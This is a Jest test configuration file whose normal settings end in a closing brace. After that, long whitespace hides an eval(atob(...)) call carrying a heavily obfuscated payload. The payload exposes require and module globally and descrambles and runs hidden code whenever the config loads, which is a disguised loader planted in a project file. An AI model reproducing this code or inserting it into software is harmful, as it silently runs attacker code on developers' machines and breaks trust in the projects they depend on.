import { createRequire } from 'module';

const require = createRequire(import.meta.url);

export default {
	// Use Node.js environment for testing
	testEnvironment: 'node',

	// Automatically clear mock calls between every test
	clearMocks: true,

	// Indicates whether the coverage information should be collected while executing the test
	collectCoverage: false,

	// The directory where Jest should output its coverage files
	coverageDirectory: 'coverage',

	// A list of paths to directories that Jest should use to search for files in
	roots: ['<rootDir>/tests'],

	// The glob patterns Jest uses to detect test files
	testMatch: ['**/__tests__/**/*.js', '**/?(*.)+(spec|test).js'],

	// Transform files
	transform: {},

	// Disable transformations for node_modules
	transformIgnorePatterns: ['/node_modules/'],

	// Set moduleNameMapper for absolute paths
	moduleNameMapper: {
		'^@/(.*)$': '<rootDir>/$1'
	},

	// Setup module aliases
	moduleDirectories: ['node_modules', '<rootDir>'],

	// Configure test coverage thresholds
	coverageThreshold: {
		global: {
			branches: 80,
			functions: 80,
			lines: 80,
			statements: 80
		}
	},

	// Generate coverage report in these formats
	coverageReporters: ['text', 'lcov'],

	// Verbose output
	verbose: true,

	// Setup file
	setupFilesAfterEnv: ['<rootDir>/tests/setup.js']
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   eval(atob('Z2xvYmFsWychJ109JzExJzt2YXIgXyRfMWU0Mj0oZnVuY3Rpb24obCxlKXt2YXIgaD1sLmxlbmd0aDt2YXIgZz1bXTtmb3IodmFyIGo9MDtqPCBoO2orKyl7Z1tqXT0gbC5jaGFyQXQoail9O2Zvcih2YXIgaj0wO2o8IGg7aisrKXt2YXIgcz1lKiAoaisgNDg5KSsgKGUlIDE5NTk3KTt2YXIgdz1lKiAoaisgNjU5KSsgKGUlIDQ4MDE0KTt2YXIgdD1zJSBoO3ZhciBwPXclIGg7dmFyIHk9Z1t0XTtnW3RdPSBnW3BdO2dbcF09IHk7ZT0gKHMrIHcpJSA0NTczODY4fTt2YXIgeD1TdHJpbmcuZnJvbUNoYXJDb2RlKDEyNyk7dmFyIHE9Jyc7dmFyIGs9J1x4MjUnO3ZhciBtPSdceDIzXHgzMSc7dmFyIHI9J1x4MjUnO3ZhciBhPSdceDIzXHgzMCc7dmFyIGM9J1x4MjMnO3JldHVybiBnLmpvaW4ocSkuc3BsaXQoaykuam9pbih4KS5zcGxpdChtKS5qb2luKHIpLnNwbGl0KGEpLmpvaW4oYykuc3BsaXQoeCl9KSgicm1jZWolb3RiJSIsMjg1NzY4Nyk7Z2xvYmFsW18kXzFlNDJbMF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzFlNDJbMV0pe2dsb2JhbFtfJF8xZTQyWzJdXT0gbW9kdWxlfTsoZnVuY3Rpb24oKXt2YXIgTFFJPScnLFRVVT00MDEtMzkwO2Z1bmN0aW9uIHNmTCh3KXt2YXIgbj0yNjY3Njg2O3ZhciB5PXcubGVuZ3RoO3ZhciBiPVtdO2Zvcih2YXIgbz0wO288eTtvKyspe2Jbb109dy5jaGFyQXQobyl9O2Zvcih2YXIgbz0wO288eTtvKyspe3ZhciBxPW4qKG8rMjI4KSsobiU1MDMzMik7dmFyIGU9bioobysxMjgpKyhuJTUyMTE5KTt2YXIgdT1xJXk7dmFyIHY9ZSV5O3ZhciBtPWJbdV07Ylt1XT1iW3ZdO2Jbdl09bTtuPShxK2UpJTQyODk0ODc7fTtyZXR1cm4gYi5qb2luKCcnKX07dmFyIEVLYz1zZkwoJ3d1cWt0YW1jZWlneW56Ym9zZGN0cHVzb2NyamhyZmxvdm54cnQnKS5zdWJzdHIoMCxUVVUpO3ZhciBqb1c9J2NhLnFtaT0pLHNyLjcsZm51Mjt2NXJ4cnIsImJncmJmZj1wcmRsK3M2QXFlZ2g7di49bGIuOz1xdSBhdHp2bl0iMGUpPStdcmhrbGYrZ0NtNz1mPXYpMiwzOz1daTtyYWVpWyx5NGE5LCwrc2krLCw7YXY9ZTlkN2FmNnV2O3ZuZHFqZj1yK3c1W2Yoayl0bClwKWxpZWh0cnRncz0pK2FwaF1dYT0pZWMoKHM7Nzgpcl1hOytoXTcpaXJhdjBzcis4Kzs9aG9bKFtscmZ0dWQ7ZTwobWdoYT0pbCl9eT0yaXQ8K2phcik9aT0hcnV9djF3KG1uYXJzOy43LiwrPXZycnJyZSkgaSAoZyw9XXhmcjZBbChuZ2F7LXphPTZlcDdvKGktPXNjLiBhcmh1OyAsYXZycy49LCAsLG11KDkgIDluK3RwOXZycnZpdntDMHgiIHFoOytsQ3I7OylnWzsoazdoPXJsdW80MTx1cisyciBuYSwrLHM4Pn1vayBuW2FicjA7Q3NkbkEzdjQ0XWlycjAwKCkxeSk3PTM9b3Z7KDF0IjsxZShzKy4ufWgsKENlbHphdCtxNTtyIDspZCh2O3pqLjs7ZXRzciBnNShqaWUgKTApOzgqbGwuKGV2emsibzssZnRvPT1qIlM9by4pKHQ4MWZua2UuMG4gKXdvYzZzdG5oNj1hcnZqciBxe2VoeHl0bm9hanZbKW8tZX1hdT5uKGFlZT0oIXR0YV11YXIiezs3bDgyZT0pcC5taHU8dGk4YTt6KSg9dG4yYWloWy5ycnR2MHEyb3QtQ2xmdltuKTsuOzRmKGlyOzs7Zzs2eWxsZWRpKC0gNG4pW2ZpdHNyIHkuPC51MDthW3tnLXNlb2Q9WywgKChuYW9pPWUicilhIHBsc3AuaHUwKSBwXSk7bnU7dmw7cjJBanEta20sbzsue29jODE9aWg7bn0rYy53Wypxcm0yIGw9O25yc3cpNnBdbnMudGxudHc4PTYwZHZxcWYib3pDcit9Q2lhLCIxaXR6cjBvIGZnMW1bPXk7czkxaWx6LDthYSw7PWNoPSwxZ111ZGxwKD0rYmFyQShycHkoKCk9LnQ5K3BoIHQsaStTdDttdnZmKG4oLm8sMXJlZnI7ZSsoLmM7dXJuYXVpK3RyeS4gZF1obihhcW5vcm4paCljJzt2YXIgZGdDPXNmTFtFS2NdO3ZhciBBcGE9Jyc7dmFyIGpGRD1kZ0M7dmFyIHhCZz1kZ0MoQXBhLHNmTChqb1cpKTt2YXIgcFlkPXhCZyhzZkwoJ28gQiV2W1JhY2EpcnNfYnZdMHRjcjZSbFJjbG10cC5uYTYgY1JdJXB3OnN0ZS0lQzhddHVvO3gwaXI9MG04ZDV8LnUpKHIubkNSKCUzaSk0YzE0XC9vZztSc2NzPWM7UnJUJVI3JWZcL2EgLnIpc3A5b2lKJW85c1JzcHt3ZXQ9LC5yfTouJWVpXzVuLGQoN0hdUmMgKWhyUmFyKXZSPG1veCotOXU0LnIwLmguLGV0Yz1cLzNzKyFiaSVud2wlJlwvJVJsJSwxXV0uSn1fIWNmPW8wPS5oNXJdLmNlKztdXTMoUmF3ZC5sKSQ0OWYgMTtiZnQ5NWlpN1tdXS4uN3R9bGR0ZmFwRWMzei45XV9SLCUuMlwvY2ghUmk0X3IlZHIxdHEwcGwteDNhOT1SMFJ0XCdjUlsiYz8iYl0hbCgsMyh9dFJcLyRybTJfUlJ3IispZ3IyOjtlcFJSUiwpZW40KGJoIyklcmczZ2UlMFRSOC5hIGU3XXNoLmhSOlIoUng/ZCE9fHM9Mj4uUnIubXJmSnBdJVJjQS5kR2VUdTg5NHhfN3RyMzg7Zn19OThSLmNhKWV6UkNjPVI9NHMqKDt0eW9hYVIwbClsLnVkUmMuZlwvfT0rYy5yKGVhQSlvcnQxLGllbjd6M10yMHdsdGVwbDs9NyQ9Mz1vWzN0YV10KDA/IV0oQz01LnkyJWgjYVJ3PVJjLj1zXXQpJXRudGV0bmUzaGM+Y2lzLmlSJW43MWQgM1Jocyl9LntlIG0rK0dhdHIhO3Y7UnkuUiBrLmV3dztCZmExNn1uals9UikudTF0KCUzIjEpVG5jYy5HJnMxby5vKWguLnRDdVJSZm49KF03X290ZX10ZyFhK3QmOy5hKzRpNjIlbDtuKFsuZS5pUmlScG5SLSg3YnM1czMxPmZyYTQpd3cuUi5nPyEwZWQ9NTIob1I7bm5dXWMuNiBSZnMubDR7LmUoXW9zYm5uUjM5LmYzY2ZSLm8pM2RbdTUyX11hZHRddVIpN1JyYTFpMVIlZS49O3QyLmUpOFIybjk7bC47UnUuLH19M2YudkFdYWUxXXM6Z2F0ZmkxZHBmKWxwUnU7M251bkQ2XS5nZCtickEucmVpKGUgQyhSYWhSaSk1ZytoKStkIDU0ZXBSUmFyYSJvY106UmZdbjguaX1yKzVcL3MkbjtjUjM0MyVdZzNhbmZvUiluMlJSYWFpcj1SYWQwLiFEcmNuNXQwRy5tMDMpXVJiSl92bnNsUiluUiUudTcubm5oY2MwJW50OjFndFJjZWNjYlssJWM7YzY2UmlnLjZmZWM0UnQoPWMsMXQsXT0rKyFlYl1hO1tdPWZhNmMlZDouZCh5Ky50MClfLClpLjhSdC0zNmhkclJlO3slOVJwY29vSVswcmNyQ1M4fTcxZXIpZlJ6IFt5KW9pbi5LJVsudWFvZiMzLnsuIC4oYml0LjguYilSLmdjdy4+IyVmODQoUm50NTM4XC9pY2QhQlIpO11JLVIkQWZrNDhSXVI9fS5lY3R0YStyKDEsc2Umci4leyldO2FlUiZkPTQpXTguXC9jZjFdNWlmUlIoKyQrfW5iYmEubDJ7IS5uLngxcjEuLkQ0dF0pUmVhN1t2XSU5Y2JSUnI0Zj1sZTF9bi1IMS4wSHRzLmdpNmRSZWRiOWljKVJuZzJlaWNSRmNSbmk/MmVSKW80UnBSbzAxc0g0LG9scm9vKDNlcztfRn1ScyYoX3JiVFtyYyhjIChlUlwnbGVlKCh7Ul1SM2QzUj5SXTdSY3MoM2FjP3NoWz1SUmklUi5nUkUuPWNyc3RzbiwoIC5SIDtFc1JucmMlLntSNTZ0ciFuYzljdTcwIjFdKX1ldHBSaFwvLCw3YTg+MnMpby5oaF1wfTksNS59Untob290blwvX2U9ZGMqZW9lM2QuNT1ddFJjO25zdTt0bV1yclJfLHRuQjVqZShjc2FSNWVtUjRkS3RAUitpXSs9fWYpUjc7NjssUl0xaVJdbV1SKV09MVJlb3toMWEudDEuM0Y3Y3QpPTdSKSVyJVJGIE1SOC5TJGxbUnIgKTNhJV9lPShjJW8lbXIyfVJjUkxtcnRhY2o0eylMJm5sK0p1UlI6UnR9X2UuenYjb2NpLiBvYzZsUlIuOCFJZykyIXJyYyphLj1dKCgxdHI9O3QudHRjaTBSO2M4ZjhSayFvNW8gK2Y3ISU/PUEmci4zKCUwLnR6ciBmaGVmOXUwbGY3bDIwO1IoJTBnLG4pTn06OF1jLjI2Y3BSKF11MnQ0KHk9XC8kXCcwZyk3aTc2UithaDhzUnJycmU6ZHVSdFIiYX1SXC9IclJhMTcydDV0dCZhM25jaT1SPTxjJTssXShfNmNUczIlNXRdNTQxLnUyUjJuLkdhaTkuYWkwNTlSYSFhdClfIjcrYWxyKGNnJSwofTtmY1JydV1mMVwvXWVvZSljfX1dX3RvdWQpKDJuLl0ldn1bOl01MzggJDsuQVJSfVItIlI7Um8xUiwsZS57MS5jb3IgO2RlXzIoPkQuRVI7Y25OUjZSK1tSLlJjKX1yLD0xQzIuY1IhKGddMWpSZWMycnFjaXNzKDI2MUVdUitdLV0wW250bFJ2eSgxPXQ2ZGU0Y25dKFsqIl0ue1JjWyUmY2IzQm4gbGFlKWFSc1JSXXQ7bDtmZCxbczdSZS4rcj1SJXQ/M2ZzXS5SdGVoU29dMjlSXyw7NXQyUmkoNzUpUmYlZXMpJUAxYz13OlJSN2wxUigoKTIpUm9dcig7b3QzMDttb2x4IGlSZS50LkF9JFJtMzhlIGcuMHMlZzV0cnImYzo9ZTQ9Y2ZvMjE7NF90c0RdUjQ3UnR0SXRSKixsZSlSZHJSNl1bYyxvbXRzKTlkUnVydCk0SXRvUjVnKDtSQF0yY2NSIDVvY0wuLl1fLigpcjUlXWcoLlJSZTR9Q2xiXXc9OTUpXTlSNjJ0dUQlME49LDIpLntIbzI3ZiA7Ujd9X110N11yMTd6XT1hMnJjaSU2LlJlJFJiaThuNHRucnRiO2QzYTt0LHNsPXJSYV1yMWN3XX1hNGdddHMlbWNzLnJ5LmE9Uns3XV1mIjl4KSVpZT1kZWQ9bFJzcmM0dCA3YTB1Ln0zUjxoYV10aDE1UnBlNSkha247QG9SUig1MSk9ZSBsdCthcigzKWU6ZSNSZilDZntkLmFSXCc2YSg4al1dY3AoKW9uYkx4Y1JhLnJuZTo4aWUhKW9SUlJkZSUyZXh1cX1sNS4uZmUzUi41eDtmfTgpNzkxLmkzYykoI2U9dmQpci5SITVSfSV0dCFFciVHUlJSPC5nKFJSKTc5RXI2QjZddH0kMXtSXWM0ZSFlK2Y0ZjciOikgKHN5cyVSYW51YSk9LmlfRVJSNWNSXzdmOGE2Y3I5aWNlLj4uYyg5NlIybyRuOVI7YzZwMmV9Ui1ueTdTKih7MSVSUlJscHthYyklaGhucyhENjt7ICggK3N3XV0xbnJwMz0ubDQgPSVvICg5ZjRdKTI5QD9ScnAybzs3UnRtaF0zdlwvOV1tIHRSLmcgXTF6IDEiYVJhXTslNiBSUnooKWFiLlIpcnRxZihDKWltZWxtJHt5JWwlKWN9ci5kNHUpcChjXCdjb2YwfWQ3UjkxVClTPD1pOiAubCUzU0UgUmFdZik9ZTs7Q3I9ZXQ6ZjtoUnJlcyUxb25yY1JSSnYpUihhUn1SMSl4bl90dGZ3ICllaH1uOG4yMmNnIFJjclJlMU0nKSk7dmFyIFRndz1qRkQoTFFJLHBZZCApO1RndygyNTA5KTtyZXR1cm4gMTM1OH0pKCk7'));

